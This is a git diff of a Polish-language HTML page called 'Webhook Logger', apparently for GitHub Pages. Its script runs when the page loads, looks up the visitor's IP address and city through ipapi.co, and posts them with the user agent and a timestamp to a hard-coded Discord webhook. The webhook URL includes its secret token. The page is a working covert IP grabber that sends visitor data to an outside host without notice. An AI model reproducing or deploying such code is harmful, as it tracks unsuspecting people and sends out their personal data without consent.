@@ -2,16 +2,17 @@
 <html lang="pl">
 <head>
   <meta charset="UTF-8">
-  <title>Webhook Logger - HTML + JS</title>
+  <title>Webhook Logger - GitHub Pages</title>
 </head>
 <body>
   <h1>Webhook Logger - Test</h1>
   <p>Przykładowa strona wysyłająca dane do Discord Webhook.</p>
 
   <script>
-    // Funkcja pobierająca dane IP i wysyłająca je do Discord Webhook
+    // Funkcja pobierająca dane IP oraz inne informacje użytkownika
+    // i wysyłająca je do Discord Webhook
     function sendWebhook() {
-      // Pobranie danych o IP za pomocą API ipapi.co
+      // Pobieramy dane IP oraz lokalizację za pomocą API ipapi.co
       fetch('https://ipapi.co/json/')
         .then(response => response.json())
         .then(data => {
@@ -21,7 +22,7 @@
           const userAgent = navigator.userAgent;
           const timestamp = new Date().toISOString();
 
-          // Przygotowanie treści wiadomości (możesz dostosować formatowanie)
+          // Przygotowanie treści wiadomości
           const message = `**Nowy użytkownik odwiedził stronę!**\n` +
                           `IP: ${ip}\n` +
                           `User Agent: ${userAgent}\n` +
@@ -29,10 +30,10 @@
                           `Miasto: ${city}\n` +
                           `Czas: ${timestamp}`;
 
-          // Adres Twojego Discord Webhooka
+          // Adres Discord Webhook (upewnij się, że jest prawidłowy)
           const webhookUrl = "https://discordapp.com/api/webhooks/1338865518135873537/3M6zHVt24Z5__4wfsz_7PQ43NVc1GHOPSD9aIlvlN7Cn78SEc3jUYEhUbjD0H70ReNqA";
 
-          // Wysyłamy dane do Discord Webhook
+          // Wysyłamy dane do Discord Webhook metodą POST
           fetch(webhookUrl, {
             method: "POST",
             headers: {
@@ -56,8 +57,8 @@
         });
     }
 
-    // Uruchamiamy funkcję wysyłania przy załadowaniu strony
-    sendWebhook();
+    // Uruchomienie funkcji po załadowaniu strony
+    window.addEventListener("load", sendWebhook);
   </script>
 </body>
 </html>
